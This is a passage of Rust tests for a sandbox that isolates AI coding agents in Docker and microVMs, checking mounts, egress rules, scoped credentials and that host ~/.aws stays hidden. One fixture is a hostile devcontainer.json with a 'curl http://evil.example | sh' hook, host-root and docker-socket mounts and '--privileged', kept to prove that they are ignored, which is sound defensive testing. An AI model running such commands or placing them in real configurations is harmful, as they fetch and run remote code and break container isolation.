    fn m13b_docker_interactive_real_agent_reads_prompt_file() {
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/s1");
        // Stage the prompt exactly as `execute_interactive_sandboxed` does.
        let guest_prompt = session
            .stage_file("do the task", "/home/agent/.varda-prompt.txt")
            .unwrap();
        let mut env = BTreeMap::new();
        env.insert("VARDA_PROMPT_FILE".to_owned(), guest_prompt.clone());
        // The config expands `interactive_command`/`interactive_args` into this spec.
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![
                "-c".to_owned(),
                "claude \"$(cat $VARDA_PROMPT_FILE)\" --add-dir /proj --permission-mode acceptEdits"
                    .to_owned(),
            ],
            env,
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Interactive).unwrap();
        assert_eq!(
            wrapped.args[0], "create",
            "real-agent interactive must create, not run"
        );
        assert!(
            wrapped.args.iter().any(|a| a == "-it"),
            "must allocate a TTY"
        );
        assert!(
            docker_env_flags(&wrapped.args)
                .iter()
                .any(|e| **e == format!("VARDA_PROMPT_FILE={guest_prompt}")),
            "the staged guest prompt path must be advertised as VARDA_PROMPT_FILE: {:?}",
            wrapped.args
        );
        // The agent argv survives verbatim after the image, so `sh -c 'claude …'` runs.
        let img_idx = wrapped.args.iter().position(|a| a == "img").unwrap();
        assert_eq!(wrapped.args[img_idx + 1], "sh");
        assert_eq!(wrapped.args[img_idx + 2], "-c");
        assert!(
            wrapped.args[img_idx + 3].contains("claude \"$(cat $VARDA_PROMPT_FILE)\""),
            "the wrapped shell must invoke the real agent reading the prompt file: {}",
            wrapped.args[img_idx + 3]
        );
        // The prompt is queued for a deferred `docker cp` (create/cp/start), not lost.
        let staged = session.staged_files.lock().unwrap();
        assert_eq!(staged.len(), 1);
        assert_eq!(staged[0].1, "/home/agent/.varda-prompt.txt");
        let _ = std::fs::remove_file(&staged[0].0);
    }

    /// M13b exit criterion: an interactive agent launch injects the FULL identity
    /// bundle (scoped auth token env, forwarded SSH-agent socket + in-guest
    /// `SSH_AUTH_SOCK`, read-only git identity) exactly as the batch path does —
    /// identity is mode-agnostic — while NEVER mounting `~/.aws`/`~/.ssh`/a
    /// credential dir. This is what authenticates the agent inside the box without
    /// a creds-dir mount, and what lets `git push` work via the forwarded agent.
    #[test]
    fn m13b_docker_interactive_injects_identity_no_creds_mount() {
        let mut auth_env = BTreeMap::new();
        auth_env.insert(
            "ANTHROPIC_API_KEY".to_owned(),
            "sk-scoped-sandbox".to_owned(),
        );
        let id = SandboxIdentity {
            auth_env,
            ssh_auth_sock: Some("/tmp/host-agent.sock".to_owned()),
            git_name: Some("Varda Bot".to_owned()),
            git_email: Some("bot@varda.dev".to_owned()),
            ..Default::default()
        };
        let session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", id);
        let mut env = BTreeMap::new();
        env.insert(
            "VARDA_PROMPT_FILE".to_owned(),
            "/home/agent/.varda-prompt.txt".to_owned(),
        );
        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![
                "-c".to_owned(),
                "claude \"$(cat $VARDA_PROMPT_FILE)\"".to_owned(),
            ],
            env,
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Interactive).unwrap();
        let envs = docker_env_flags(&wrapped.args);
        assert!(
            envs.iter()
                .any(|e| *e == "ANTHROPIC_API_KEY=sk-scoped-sandbox"),
            "scoped auth token must be injected on the interactive path: {envs:?}"
        );
        assert!(
            envs.iter()
                .any(|e| **e == format!("SSH_AUTH_SOCK={SSH_AGENT_GUEST_SOCK}")),
            "in-guest SSH_AUTH_SOCK must point at the forwarded socket: {envs:?}"
        );
        assert!(envs.iter().any(|e| *e == "GIT_AUTHOR_NAME=Varda Bot"));
        assert!(
            envs.iter()
                .any(|e| *e == "GIT_COMMITTER_EMAIL=bot@varda.dev")
        );
        let vs = docker_v_flags(&wrapped.args);
        assert!(
            vs.iter()
                .any(|v| **v == format!("/tmp/host-agent.sock:{SSH_AGENT_GUEST_SOCK}")),
            "the host SSH-agent socket must be forwarded as a bind for git push: {vs:?}"
        );
        // Exit criterion: no credential dir is EVER visible in-guest.
        for v in &vs {
            assert!(
                !v.contains("/.aws")
                    && !v.contains("/.ssh")
                    && !v.contains("/.claude")
                    && !v.contains("/.codex")
                    && !v.contains("/.copilot"),
                "no credential dir may be mounted on the interactive path: {v}"
            );
        }
    }

    /// M4 live exit criteria — verified against a real `msb` microVM: a
    /// read-only mount blocks writes, host `~/.aws` is NOT visible (own-kernel
    /// isolation), and the session store round-trips guest→host via `msb cp`.
    #[tokio::test]
    #[ignore = "requires the msb (microsandbox) runtime"]
    async fn microsandbox_isolates_and_round_trips_live() {
        use tokio::process::Command as TokioCommand;

        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("msb-it-proj");
        std::fs::create_dir_all(&root).unwrap();

        let provider = MicrosandboxProvider::from_config(
            "microsandbox",
            &SandboxConfig {
                image: Some("busybox".to_owned()),
                primitive: "microsandbox".to_owned(),
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap();
        let session = provider
            .prepare(&ctx_with_id(&root, "msb-it-1"))
            .await
            .unwrap();
        let store = session.session_store_root().expect("store root");

        // The agent writes a session-store file under HOME and probes host creds.
        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![
                    "-c".to_owned(),
                    "mkdir -p \"$HOME/.claude\" && echo hi > \"$HOME/.claude/transcript.jsonl\"; \
                     ls /Users/nilleb/.aws >/dev/null 2>&1 && echo AWS_VISIBLE || echo AWS_HIDDEN"
                        .to_owned(),
                ],
                    env: BTreeMap::new(),
                    cwd: Some(root.clone()),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let out = TokioCommand::new(&spec.program)
            .args(&spec.args)
            .output()
            .await
            .expect("failed to run msb");
        let stdout = String::from_utf8_lossy(&out.stdout).to_string();

        let extracted = if out.status.success() {
            session.extract_session_store().await
        } else {
            Ok(())
        };
        let got = std::fs::read_to_string(store.join(".claude/transcript.jsonl"));
        session.teardown().await.ok();

        assert!(out.status.success(), "msb run should succeed: {stdout}");
        assert!(
            stdout.contains("AWS_HIDDEN"),
            "host ~/.aws must NOT be visible in the microVM; got: {stdout}"
        );
        extracted.expect("msb cp extraction should succeed");
        assert_eq!(
            got.expect("session store must round-trip guest→host via msb cp")
                .trim(),
            "hi"
        );
    }

    /// #535 live exit criterion — the resident's rw project/workspace mount is
    /// HOST-VISIBLE: a file the guest writes under the mounted project path appears
    /// on the host DIRECTLY (no `msb cp`), which is what makes an in-box merge
    /// committable. Also confirms an explicit `{proj}:{proj}:rw` mount (the resident
    /// gate's shape) does NOT trip msb's "multiple volumes … same guest path".
    #[tokio::test]
    #[ignore = "requires the msb (microsandbox) runtime"]
    async fn microsandbox_workspace_mount_is_rw_and_host_visible_live() {
        use tokio::process::Command as TokioCommand;

        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("msb-it-ws");
        std::fs::create_dir_all(&root).unwrap();
        let marker = root.join("guest-wrote.txt");
        let _ = std::fs::remove_file(&marker);

        // Mirror the orchestrate/resident shape: an EXPLICIT rw workspace mount of
        // the project path, exactly what `workspace_mounted_rw` requires. The fix
        // must dedup this against the auto project mount rather than double-mount it.
        let provider = MicrosandboxProvider::from_config(
            "microsandbox",
            &SandboxConfig {
                image: Some("busybox".to_owned()),
                primitive: "microsandbox".to_owned(),
                ..Default::default()
            },
            // The pre-merged, origin-tagged mount set: the explicit rw workspace
            // mount the resident gate requires (== the project path).
            vec![(MountOrigin::Route, format!("{0}:{0}:rw", root.display()))],
        )
        .unwrap();
        let session = provider
            .prepare(&ctx_with_id(&root, "msb-it-ws-1"))
            .await
            .unwrap();

        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![
                        "-c".to_owned(),
                        format!("echo committed > {}", marker.display()),
                    ],
                    env: BTreeMap::new(),
                    cwd: Some(root.clone()),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        // No duplicate guest path in the generated argv (the bug this fixes).
        let mut seen = std::collections::HashSet::new();
        for w in spec.args.windows(2) {
            if w[0] == "--mount-dir" {
                assert!(
                    seen.insert(parse_mount(&w[1]).unwrap().target),
                    "duplicate guest mount path in argv: {:?}",
                    spec.args
                );
            }
        }
        let out = TokioCommand::new(&spec.program)
            .args(&spec.args)
            .output()
            .await
            .expect("failed to run msb");
        let host_visible = std::fs::read_to_string(&marker);
        session.teardown().await.ok();

        assert!(
            out.status.success(),
            "msb run must succeed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(
            host_visible
                .expect("guest write must be visible on the host via the rw bind")
                .trim(),
            "committed"
        );
        let _ = std::fs::remove_file(&marker);
    }

    /// #546 last-mile LIVE exit criterion — the guest reaches the host-gated broker
    /// through `host.microsandbox.internal`. A real `SpawnBroker` binds a TCP
    /// listener on HOST loopback (`127.0.0.1`), and an msb guest — launched under
    /// `--net-default-egress deny` with `--net-rule allow@host` (added by `wrap`
    /// because the guest env carries `VARDA_MCP_HOST`/`VARDA_MCP_PORT`) — dials
    /// `socat TCP:host.microsandbox.internal:$VARDA_MCP_PORT` and completes an MCP
    /// `tools/list`, whose reply advertises `spawn_subtask`. Proves the guest's own
    /// loopback is NOT the host, that `host.microsandbox.internal` bridges to the
    /// host loopback service, and that the `host` net-rule is what unblocks it.
    /// Needs the msb runtime AND a guest image with `socat` + `sh` (override via
    /// `VARDA_MSB_SOCAT_IMAGE`).
    #[tokio::test]
    #[ignore = "requires the msb (microsandbox) runtime and a socat-capable guest image"]
    async fn microsandbox_guest_reaches_broker_via_host_internal_live() {
        use tokio::process::Command as TokioCommand;

        // A live broker on HOST loopback, exactly as the run path binds it.
        struct NoopLauncher;
        impl crate::orchestration::SubtaskLauncher for NoopLauncher {
            fn launch(
                &mut self,
                _req: &crate::orchestration::SpawnRequest,
                _grant: &crate::orchestration::SpawnGrant,
            ) -> anyhow::Result<crate::orchestration::SubtaskId> {
                Ok("child-1".to_owned())
            }
            fn run_existing(
                &mut self,
                task_id: &str,
                _grant: &crate::orchestration::SpawnGrant,
            ) -> anyhow::Result<crate::orchestration::SubtaskId> {
                Ok(task_id.to_owned())
            }
        }
        let policy = crate::orchestration::OrchestrationPolicy {
            enabled: true,
            ..Default::default()
        };
        let broker = std::sync::Arc::new(crate::orchestration::SpawnBroker::new(
            policy,
            "root",
            NoopLauncher,
        ));
        let (addr, listener) =
            crate::mcp_transport::bind_tcp(std::net::Ipv4Addr::LOCALHOST.into())
                .await
                .unwrap();
        let server = tokio::spawn(async move {
            let _ = crate::mcp_transport::serve_tcp(listener, "root".to_owned(), broker).await;
        });
        let port = addr.port().to_string();

        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("msb-it-broker");
        std::fs::create_dir_all(&root).unwrap();
        let image =
            std::env::var("VARDA_MSB_SOCAT_IMAGE").unwrap_or_else(|_| "alpine/socat".to_owned());
        // Egress must permit the broker's `host` group; api.anthropic.com stands in
        // for the agent's normal egress so we exercise `allow@host` ALONGSIDE it.
        let provider = MicrosandboxProvider::from_config(
            "microsandbox",
            &SandboxConfig {
                image: Some(image),
                primitive: "microsandbox".to_owned(),
                egress: vec!["api.anthropic.com".to_owned()],
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap();
        let session = provider
            .prepare(&ctx_with_id(&root, "msb-it-broker-1"))
            .await
            .unwrap();

        // The guest env carries what `env_for_request` exports for a VM broker, so
        // `wrap` adds `--net-rule allow@host` and the guest dials the host name.
        let mut env = BTreeMap::new();
        env.insert(
            "VARDA_MCP_HOST".to_owned(),
            "host.microsandbox.internal".to_owned(),
        );
        env.insert("VARDA_MCP_PORT".to_owned(), port);
        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![
                        "-c".to_owned(),
                        // One-line MCP `tools/list`; the broker replies with a line
                        // advertising the four tools including spawn_subtask.
                        "printf '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\"}\\n' \
                         | socat - TCP:${VARDA_MCP_HOST:-host.microsandbox.internal}:$VARDA_MCP_PORT"
                            .to_owned(),
                    ],
                    env,
                    cwd: Some(root.clone()),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        // The generated argv must carry the host allow-rule (real-code assertion).
        assert!(
            spec.args
                .windows(2)
                .any(|w| w[0] == "--net-rule" && w[1] == "allow@host"),
            "broker-enabled msb argv must allow the host group; argv: {:?}",
            spec.args
        );

        let out = TokioCommand::new(&spec.program)
            .args(&spec.args)
            .output()
            .await
            .expect("failed to run msb");
        server.abort();
        session.teardown().await.ok();

        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(
            out.status.success(),
            "msb run must succeed: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert!(
            stdout.contains("spawn_subtask"),
            "guest must reach the host broker via host.microsandbox.internal and see \
             tools/list; got: {stdout}"
        );
    }

    /// clawk parses and resolves, but `prepare()` fails with the contractually
    /// clear missing-runtime message when the CLI is not on PATH. The command
    /// lookup is a fake seam so this test never depends on the developer machine.
    #[tokio::test]
    async fn clawk_provider_prepare_errors_clearly_when_runtime_missing() {
        fn missing(_: &str) -> bool {
            false
        }
        let provider = ClawkProvider::from_config(
            "vm",
            &SandboxConfig {
                primitive: "clawk".to_owned(),
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap()
        .with_command_exists(missing);
        let root = Path::new("/proj");
        let err = match provider.prepare(&ctx(root)).await {
            Ok(_) => panic!("prepare should not succeed without clawk"),
            Err(err) => err.to_string(),
        };
        assert_eq!(
            err,
            "sandbox primitive 'clawk' requires the clawk CLI on PATH"
        );
    }

    /// clawk argv shape: project rw mount, extra mounts with Varda's ro/rw
    /// grammar, default-deny network when egress is present, env/identity folded
    /// into guest flags, command after `--`. Pure unit test; needs no clawk.
    #[test]
    fn clawk_wrap_produces_expected_argv() {
        let mut auth_env = BTreeMap::new();
        auth_env.insert("ANTHROPIC_API_KEY".to_owned(), "scoped".to_owned());
        let session = ClawkSession {
            image: Some("varda:latest".to_owned()),
            project_root: PathBuf::from("/proj"),
            mounts: vec![
                (MountOrigin::Sandbox, "/cache:/cache:ro".to_owned()),
                (MountOrigin::Route, "/shared:/shared:rw".to_owned()),
            ],
            egress: vec!["api.openai.com".to_owned()],
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-abc".to_owned(),
            home: "/home/agent".to_owned(),
            identity: SandboxIdentity {
                auth_env,
                git_name: Some("Varda Bot".to_owned()),
                git_email: Some("bot@example.com".to_owned()),
                ..Default::default()
            },
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let mut env = BTreeMap::new();
        env.insert("FOO".to_owned(), "bar".to_owned());
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "codex".to_owned(),
                    args: vec!["--print".to_owned(), "-".to_owned()],
                    env,
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert_eq!(wrapped.program, "clawk");
        assert_eq!(
            wrapped.args,
            vec![
                "run",
                "--name",
                "varda-sbx-abc",
                "--project",
                "/proj",
                "--home",
                "/home/agent",
                "--image",
                "varda:latest",
                "--network",
                "default-deny",
                "--mount",
                "/proj:/proj:rw",
                "--mount",
                "/cache:/cache:ro",
                "--mount",
                "/shared:/shared:rw",
                "--workdir",
                "/proj",
                "--env",
                "ANTHROPIC_API_KEY=scoped",
                "--env",
                "FOO=bar",
                "--env",
                "GIT_AUTHOR_EMAIL=bot@example.com",
                "--env",
                "GIT_AUTHOR_NAME=Varda Bot",
                "--env",
                "GIT_COMMITTER_EMAIL=bot@example.com",
                "--env",
                "GIT_COMMITTER_NAME=Varda Bot",
                "--env",
                "HOME=/home/agent",
                "--",
                "codex",
                "--print",
                "-",
            ]
        );
        assert!(wrapped.env.is_empty());
        assert!(wrapped.cwd.is_none());
        assert!(!session.store_is_live());
        assert_eq!(
            session.session_store_root(),
            Some(PathBuf::from("/host/store"))
        );
    }

    #[test]
    fn clawk_rejects_unsupported_file_mounts_loudly() {
        let dir = std::env::temp_dir().join(format!("varda-clawk-file-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("data.txt");
        std::fs::write(&file, "data").unwrap();
        let session = ClawkSession {
            image: None,
            project_root: dir.clone(),
            mounts: vec![(MountOrigin::Route, format!("{}:/data:ro", file.display()))],
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-file".to_owned(),
            home: "/home/agent".to_owned(),
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let err = session
            .validate_mounts()
            .expect_err("file-level clawk mount must be rejected");
        assert!(
            err.to_string().contains("does not support file bind mount"),
            "unexpected error: {err:#}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn clawk_staged_credential_is_private_and_cleaned() {
        use std::os::unix::fs::PermissionsExt as _;
        let session = Box::new(ClawkSession {
            image: None,
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-clean".to_owned(),
            home: "/home/agent".to_owned(),
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        });
        session
            .stage_credential_file("scoped-secret", "/home/agent/.token")
            .unwrap();
        let host_temp = session.staged_files.lock().unwrap()[0].0.clone();
        let mode = std::fs::metadata(&host_temp).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o444);
        assert_credential_dir_is_private(&host_temp);
        session.teardown().await.unwrap();
        assert!(!host_temp.exists());
    }

    #[tokio::test]
    #[ignore = "requires the clawk runtime"]
    async fn clawk_live_smoke_requires_installed_runtime() {
        if !command_on_path("clawk") {
            return;
        }
        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("clawk-it-proj");
        std::fs::create_dir_all(&root).unwrap();
        let provider = ClawkProvider::from_config(
            "clawk",
            &SandboxConfig {
                primitive: "clawk".to_owned(),
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap();
        let session = provider
            .prepare(&ctx_with_id(&root, "clawk-it-1"))
            .await
            .unwrap();
        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec!["-c".to_owned(), "printf clawk-ok".to_owned()],
                    env: BTreeMap::new(),
                    cwd: Some(root),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let final_spec = session.begin_batch(spec).await.unwrap();
        let out = tokio::process::Command::new(&final_spec.program)
            .args(&final_spec.args)
            .output()
            .await
            .expect("failed to run clawk");
        session.teardown().await.ok();
        assert!(out.status.success());
        assert_eq!(String::from_utf8_lossy(&out.stdout), "clawk-ok");
    }

    /// M5: a `build` sandbox defers image resolution to `prepare()`; a missing
    /// Dockerfile surfaces there as a read error rather than at config time.
    #[tokio::test]
    async fn docker_build_missing_dockerfile_errors_at_prepare() {
        let provider = DockerProvider::from_config(
            "built",
            &SandboxConfig {
                build: Some("/nonexistent/Dockerfile.does-not-exist".to_owned()),
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap();
        let root = Path::new("/proj");
        let err = match provider.prepare(&ctx(root)).await {
            Ok(_) => panic!("build prepare with a missing Dockerfile should not succeed"),
            Err(err) => err.to_string(),
        };
        assert!(
            err.contains("Dockerfile") || err.contains("failed to read"),
            "unexpected build error: {err}"
        );
    }

    // ---- M7: devcontainer.json as an image source ----

    /// A unique scratch dir under `target/` for a devcontainer discovery test.
    fn devc_root(tag: &str) -> PathBuf {
        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join(format!("m7-devc-{tag}"));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        root
    }

    /// M7: `.devcontainer/devcontainer.json` with an `image` ⇒ that image is used
    /// verbatim. JSONC comments and a trailing comma are tolerated.
    #[tokio::test]
    async fn devcontainer_image_field_is_used() {
        let root = devc_root("image");
        let dir = root.join(".devcontainer");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("devcontainer.json"),
            r#"{
                // pinned toolchain image
                "name": "demo",
                "image": "busybox:1.36", /* trailing comma below is legal JSONC */
            }"#,
        )
        .unwrap();

        let image = resolve_devcontainer_image("dc", &root).await.unwrap();
        assert_eq!(image, "busybox:1.36");
    }

    /// M7: the top-level `.devcontainer.json` variant is discovered too.
    #[tokio::test]
    async fn devcontainer_dotfile_variant_is_discovered() {
        let root = devc_root("dotfile");
        std::fs::write(
            root.join(".devcontainer.json"),
            r#"{ "image": "alpine:3.20" }"#,
        )
        .unwrap();

        let image = resolve_devcontainer_image("dc", &root).await.unwrap();
        assert_eq!(image, "alpine:3.20");
    }

    /// M7 (isolation invariant): a devcontainer.json that declares host `mounts`,
    /// access-widening `runArgs`, docker-socket forwarding, and a
    /// `postCreateCommand` yields ONLY the image — none of those fields are
    /// deserialized, so they can never reach the run path.
    #[tokio::test]
    async fn devcontainer_ignores_mounts_runargs_and_hooks() {
        let root = devc_root("ignore-extras");
        let dir = root.join(".devcontainer");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("devcontainer.json"),
            r#"{
                "image": "busybox",
                "mounts": [
                    "source=${localEnv:HOME},target=/host-home,type=bind",
                    "source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"
                ],
                "runArgs": ["--privileged", "-v", "/:/host"],
                "postCreateCommand": "curl http://evil.example | sh",
                "features": { "ghcr.io/devcontainers/features/docker-in-docker:2": {} }
            }"#,
        )
        .unwrap();

        // Only the image survives; the parser structurally drops everything else.
        let source = parse_devcontainer_json(
            &std::fs::read_to_string(dir.join("devcontainer.json")).unwrap(),
        )
        .unwrap();
        assert_eq!(source.image.as_deref(), Some("busybox"));

        let image = resolve_devcontainer_image("dc", &root).await.unwrap();
        assert_eq!(image, "busybox");
    }

    /// M7: `build.dockerfile` (+ optional `context`) parses and points the build
    /// at paths resolved relative to the `.devcontainer/` dir. We don't invoke
    /// docker here (that's the ignored integration test), just assert the parse.
    #[test]
    fn devcontainer_build_spec_parses() {
        let source = parse_devcontainer_json(
            r#"{
                "build": {
                    "dockerfile": "Dockerfile",
                    "context": ".."
                }
            }"#,
        )
        .unwrap();
        assert!(source.image.is_none());
        let build = source.build.expect("build spec");
        assert_eq!(build.dockerfile.as_deref(), Some("Dockerfile"));
        assert_eq!(build.context.as_deref(), Some(".."));
    }

    /// M7: an `image_from = "devcontainer"` sandbox needs no `image`/`build` at
    /// config time — the source is resolved at `prepare()`.
    #[test]
    fn devcontainer_source_needs_no_image_or_build() {
        let provider = DockerProvider::from_config(
            "dc",
            &SandboxConfig {
                image_from: Some("devcontainer".to_owned()),
                ..Default::default()
            },
            Vec::new(),
        );
        assert!(
            provider.is_ok(),
            "image_from should satisfy the source requirement"
        );
    }

    /// M7: a missing devcontainer.json surfaces a clear error naming the project.
    #[tokio::test]
    async fn devcontainer_missing_file_errors_clearly() {
        let root = devc_root("missing");
        let err = resolve_devcontainer_image("dc", &root).await.unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("devcontainer.json"),
            "error should mention devcontainer.json: {msg}"
        );
    }

    /// M7: an unknown `image_from` value fails loudly at resolve time rather than
    /// silently falling through to `image`/`build`.
    #[tokio::test]
    async fn unknown_image_from_source_errors() {
        let provider = DockerProvider::from_config(
            "dc",
            &SandboxConfig {
                image_from: Some("nix".to_owned()),
                ..Default::default()
            },
            Vec::new(),
        )
        .unwrap();
        let err = provider
            .resolve_image(Path::new("/proj"))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("unknown `image_from"),
            "unexpected error: {err}"
        );
    }

    /// M7 (isolation invariant, live): a project whose devcontainer.json tries to
    /// mount host `$HOME` runs the agent, but the container must NOT see host
    /// `$HOME`/`~/.aws` — varda took only the image (`busybox`) and applies its
    /// own mount policy. Requires docker.
    #[tokio::test]
    #[ignore = "requires docker"]
    async fn devcontainer_home_mount_is_ignored_live() {
        use tokio::process::Command as TokioCommand;

        // A project with a hostile devcontainer.json under the repo's target/
        // tree (visible to a VM-backed daemon that shares only ~/dev).
        let root = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("m7-devc-live-proj");
        let dir = root.join(".devcontainer");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("devcontainer.json"),
            r#"{
                "image": "busybox",
                "mounts": [
                    "source=${localEnv:HOME},target=/root,type=bind",
                    "source=${localEnv:HOME}/.aws,target=/aws,type=bind"
                ],
                "runArgs": ["-v", "/:/host"]
            }"#,
        )
        .unwrap();

        let resolved = SandboxConfig {
            image_from: Some("devcontainer".to_owned()),
            ..Default::default()
        };
        let provider = DockerProvider::from_config("dc", &resolved, Vec::new()).unwrap();
        docker_cleanup("devc-home-1").await;
        let session = provider
            .prepare(&ctx_with_id(&root, "devc-home-1"))
            .await
            .unwrap();

        // Probe: is the host home / ~/.aws visible inside the container? The
        // devcontainer asked to mount them at /root and /aws; varda ignores that,
        // so neither host tree should be readable.
        let spec = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![
                        "-c".to_owned(),
                        "ls /aws >/dev/null 2>&1 && echo AWS_VISIBLE || echo AWS_HIDDEN".to_owned(),
                    ],
                    env: BTreeMap::new(),
                    cwd: Some(root.clone()),
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let out = TokioCommand::new(&spec.program)
            .args(&spec.args)
            .output()
            .await
            .expect("failed to run docker");
        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
        session.teardown().await.ok();

        assert!(
            out.status.success(),
            "container run should succeed: {stdout}"
        );
        assert!(
            stdout.contains("AWS_HIDDEN"),
            "devcontainer `mounts` must be ignored — host ~/.aws must NOT be visible; got: {stdout}"
        );
    }

    // ---- M6a: mount grammar + three-origin (two in M6a) merge ----

    /// Collect the `-v` mount values (the arg after each `-v`) from a wrapped
    /// docker argv.
    fn mount_values(wrapped: &CommandSpec) -> Vec<String> {
        wrapped
            .args
            .iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && wrapped.args[i - 1] == "-v")
            .map(|(_, v)| v.clone())
            .collect()
    }

    /// M6a grammar: source-only ⇒ same-path, read-only.
    #[test]
    fn parse_mount_source_only_is_same_path_ro() {
        let spec = parse_mount("/data").unwrap();
        assert_eq!(
            spec,
            MountSpec {
                source: PathBuf::from("/data"),
                target: PathBuf::from("/data"),
                writable: false,
            }
        );
    }

    /// M6a grammar: `SOURCE:ro|:w` sets the mode, target defaults to source.
    #[test]
    fn parse_mount_source_with_mode() {
        assert!(!parse_mount("/data:ro").unwrap().writable);
        assert!(parse_mount("/data:w").unwrap().writable);
        assert!(parse_mount("/data:rw").unwrap().writable);
        let w = parse_mount("~/ctx:w").unwrap();
        assert_eq!(w.source, PathBuf::from("~/ctx"));
        assert_eq!(w.target, PathBuf::from("~/ctx"));
        assert!(w.writable);
    }

    /// M6a grammar: `SOURCE:TARGET` (absolute target) is an explicit target, ro.
    #[test]
    fn parse_mount_explicit_target() {
        let spec = parse_mount("~/dev/brain/AsianDevBank:/context/adb").unwrap();
        assert_eq!(spec.source, PathBuf::from("~/dev/brain/AsianDevBank"));
        assert_eq!(spec.target, PathBuf::from("/context/adb"));
        assert!(!spec.writable);
    }

    /// M6a grammar: full `SOURCE:TARGET:mode` form.
    #[test]
    fn parse_mount_explicit_target_and_mode() {
        let spec = parse_mount("/src:/dst:w").unwrap();
        assert_eq!(spec.source, PathBuf::from("/src"));
        assert_eq!(spec.target, PathBuf::from("/dst"));
        assert!(spec.writable);
    }

    /// M6a grammar: malformed forms error (non-mode/non-abs middle segment,
    /// relative target in the 3-segment form, and empty source).
    #[test]
    fn parse_mount_malformed_errors() {
        assert!(parse_mount("/src:relative").is_err());
        assert!(parse_mount("/src:relative:ro").is_err());
        assert!(parse_mount("/src:/dst:bogus").is_err());
        assert!(parse_mount("").is_err());
    }

    /// M6a: the canonical TOML table form deserializes into a `MountSpec`
    /// (source-only ⇒ same-path ro; explicit target + mode honoured).
    #[test]
    fn mount_spec_table_form_deserializes() {
        #[derive(Deserialize)]
        struct Wrap {
            mount: MountSpec,
        }
        let only: Wrap = toml::from_str("mount = { source = \"/data\" }").unwrap();
        assert_eq!(
            only.mount,
            MountSpec {
                source: PathBuf::from("/data"),
                target: PathBuf::from("/data"),
                writable: false,
            }
        );
        let full: Wrap = toml::from_str(
            "mount = { source = \"~/dev/brain/AsianDevBank\", target = \"/context/adb\", mode = \"ro\" }",
        )
        .unwrap();
        assert_eq!(full.mount.target, PathBuf::from("/context/adb"));
        assert!(!full.mount.writable);
        // The string shorthand also flows through the same Deserialize helper.
        let shorthand: Wrap = toml::from_str("mount = \"/opt/cache:w\"").unwrap();
        assert!(shorthand.mount.writable);
    }

    /// M6a exit criterion: a `Route.mounts` entry in the string form reaches the
    /// docker argv as `-v SOURCE:SOURCE:ro` (target defaults to the expanded
    /// source). Uses an absolute source so the assertion is host-independent.
    #[test]
    fn route_mount_reaches_argv_same_path_ro() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![(MountOrigin::Route, "/ctx/adb:ro".to_owned())],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
